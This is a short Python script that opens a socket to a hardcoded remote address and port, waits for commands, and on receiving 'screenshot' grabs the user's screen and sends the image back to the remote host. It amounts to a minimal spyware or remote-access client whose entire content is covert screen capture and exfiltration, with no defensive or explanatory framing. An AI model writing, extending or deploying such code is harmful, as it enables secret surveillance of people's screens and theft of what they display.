import socket
import pyscreenshot as IG
from PIL import Image
s = socket.socket()

s.connect(("172.19.200.30",9095))
while 1==1:
    d=str(s.recv(40960000),"utf-8")
    print(d)
    
    if d == "screenshot":
        img=IG.grab()
        img.save("sc.png")
        with open("sc.png","rb") as f:
            s.sendfile(f,0)
    else:
        s.send(b"non")
        
        
    
hey
